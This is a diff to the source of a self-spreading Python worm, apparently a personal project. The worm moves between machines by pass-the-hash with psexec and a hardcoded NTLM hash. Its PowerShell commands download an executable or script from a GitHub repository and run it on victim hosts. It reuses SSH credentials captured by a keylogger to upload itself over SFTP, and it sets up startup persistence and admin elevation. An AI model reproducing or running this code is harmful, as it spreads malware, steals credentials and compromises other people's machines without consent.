@@ -6,7 +6,6 @@ import subprocess
 import psutil # to work with system processes
 import sys
 import ftplib # we use remote ftp (public) storage
-import flask
 import re
 import sqlite3
 import flask # for the local webserver we run
@@ -24,9 +23,9 @@ from datetime import datetime
 from time import sleep
 from flask import request, Flask, send_from_directory
 
-# compile using: pyinstaller --onefile --paths=venv\Lib\site-packages --onedir ./main.py
+# compile using: pyinstaller --onefile --paths=venv\Lib\site-packages ./main.py
 # set to True when compiling using pyinstaller, when developing keep False.
-IS_EXECUTABLE = False
+IS_EXECUTABLE = True
 
 # whether we're on windows
 IS_WINDOWS = any(platform.win32_ver())
@@ -262,17 +261,22 @@ def passthehash():
         for account in accounts:
             username, passhash = account
             ip, port = host
+            if ip == get_local_ip(): # we dont wanna infect ourselves
+                continue
             # this is the command used to download the worm on the target
+            # doesnt work
             # remote_cmd = r"""start '' powershell.exe -Command `"echo starting infection...; &{ (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh', 'C:\test.sh') }; start test.sh; echo done, exiting...; sleep 5`" """
             # doesnt work:
             # powershell.exe /c .\psexec_windows.exe -hashes ':f6bb3bd80a37a2c11e351f62bd43dd92' -port 445 'mahmo@10.0.2.5' "powershell.exe -Command 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6'"
-            # works:
+            # works alone
             # .\psexec_windows.exe -hashes ':f6bb3bd80a37a2c11e351f62bd43dd92' -port 445 'mahmo@10.0.2.5' "powershell.exe -Command 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6'"
             # powershell.exe twice is intentional, it is to circumvent argument handling of cmd.exe
             # this took me hours to get right, windows argument handling is a nightmare
-            remote_cmd = r"""powershell.exe powershell.exe 'echo starting infection...; (New-Object System.Net.WebClient).DownloadFile(''https://raw.githubusercontent.com/mahmoodsh36/test2/main/test.sh'' , ''C:\test.sh''); start C:\test.sh; echo done, exiting...; sleep 6' """
+            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.exe'' , ''C:\main.exe''); start C:\main.exe; echo exiting...; sleep 3' """
+            # remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python C:\main.py; echo exiting...; sleep 3' """
             # this is the command used to connect to the target and run 'remote_cmd'
             #connect_cmd = f"./{psexec} -hashes ':{passhash}' -port 445 mahmo@10.0.2.4 '{remote_cmd}'"
+            remote_cmd = r"""powershell.exe powershell.exe 'echo starting_infection...; (New-Object System.Net.WebClient).DownloadFile(''https://github.com/mahmoodsh36/test2/raw/main/main.py'' , ''C:\main.py''); python -m venv venv; venv\Scripts\pip.exe install tqdm psutil flask pynput requests rich paramiko; venv\Scripts\python.exe main.py; echo exiting...; sleep 3' """
             connect_cmd = f"powershell.exe .\\{psexec} -hashes ':{passhash}' -port {port} '{username}@{ip}' \"{remote_cmd}\""
             my_print(f'attempting to connect to {username}@{ip}:{port} with hash {passhash}')
             my_print(f'running command: {connect_cmd}')
@@ -309,28 +313,28 @@ class KeyHist:
     def add_key(self, key, is_alphanumeric):
         self.key_list.insert(len(self.key_list), HistEntry(key, is_alphanumeric))
 
-    def candidate_sequences(self, min_length, max_length):
-        """
-        this function finds sequences of typed keys that are 'MAX_TYPING_INTERVAL' away
-        from each other and are of length atleast 'min_length' and at most 'max_length',
-        used to check those subsequences for pattern of emails, ssh credentials, etc.
-        these sequences have to be of length atleast 'min_len'.
-        """
-        for seq, begin, end in consecutive_subseqs_bounded_length(
-                self.key_list,
-                min_length,
-                max_length):
-            accept = False
-            # if the sequence was started after a delay of no typing
-            if (begin > 0 and seq[begin - 1].timestamp - seq[begin].timestamp).total_seconds() > MAX_TYPING_INTERVAL:
-                accept = True
-            for (index, thing) in enumerate(seq[:-1]):
-                current, _next = thing, seq[index + 1]
-                if (current.timestamp - _next.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
-                    accept = False
-            modified_seq = [entry for entry in seq if entry.is_alphanumeric]
-            if accept:
-                yield modified_seq
+#    def candidate_sequences(self, min_length, max_length):
+#        """
+#        this function finds sequences of typed keys that are 'MAX_TYPING_INTERVAL' away
+#        from each other and are of length atleast 'min_length' and at most 'max_length',
+#        used to check those subsequences for pattern of emails, ssh credentials, etc.
+#        these sequences have to be of length atleast 'min_len'.
+#        """
+#        for seq, begin, end in consecutive_subseqs_bounded_length(
+#                self.key_list,
+#                min_length,
+#                max_length):
+#            accept = False
+#            # if the sequence was started after a delay of no typing
+#            if (begin > 0 and seq[begin - 1].timestamp - seq[begin].timestamp).total_seconds() > MAX_TYPING_INTERVAL:
+#                accept = True
+#            for (index, thing) in enumerate(seq[:-1]):
+#                current, _next = thing, seq[index + 1]
+#                if (current.timestamp - _next.timestamp).total_seconds() > MAX_TYPING_INTERVAL:
+#                    accept = False
+#            modified_seq = [entry for entry in seq if entry.is_alphanumeric]
+#            if accept:
+#                yield modified_seq
 
     def hist_to_str(seq):
         return ''.join([item.key for item in seq])
@@ -427,7 +431,7 @@ class KeyHist:
         """
         # if we have captured any ssh credentials, upload the value to the corresponding
         # machines and start the program there
-        for addr, usr, password in ssh.check_for_ssh_credentials():
+        for addr, usr, password in self.check_for_ssh_credentials():
             transport = paramiko.Transport((addr, 22))
             transport.connect(username=usr, password=password)
             sftp = paramiko.SFTPClient.from_transport(transport)
@@ -511,17 +515,11 @@ if __name__ == '__main__':
     if job is None:
         # copy the file
         try:
-            print(THIS_PATH)
             shutil.copy(base_cmd[-1], HOME_DIR)
-            NEW_PATH = THIS_PATH
-        except shutil.SameFileError:
+            # after copying it over we need to modify base_cmd accordingly
+            base_cmd[-1] = os.path.join(HOME_DIR, os.path.basename(base_cmd[-1]))
+        except:
             pass
-
-        NEW_PATH = os.path.join(HOME_DIR, base_cmd[-1])
-        print(NEW_PATH)
-
-        # after copying it over we need to modify base_cmd accordingly
-        base_cmd[-1] = NEW_PATH
 
         # to run the script on startup (windows only)
         if IS_WINDOWS:
@@ -595,7 +593,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
         MORE_FILES_DIR = 'Login_files'
         s = ftp.cwd(MORE_FILES_DIR)
         filenames = ftp.nlst() # get filenames within the directory
-        my_print(filenames)
+        my_print(f'got files {filenames}')
         for filename in filenames:
             print(os.path.join(MORE_FILES_DIR, filename))
             if not os.path.join(MORE_FILES_DIR, filename):
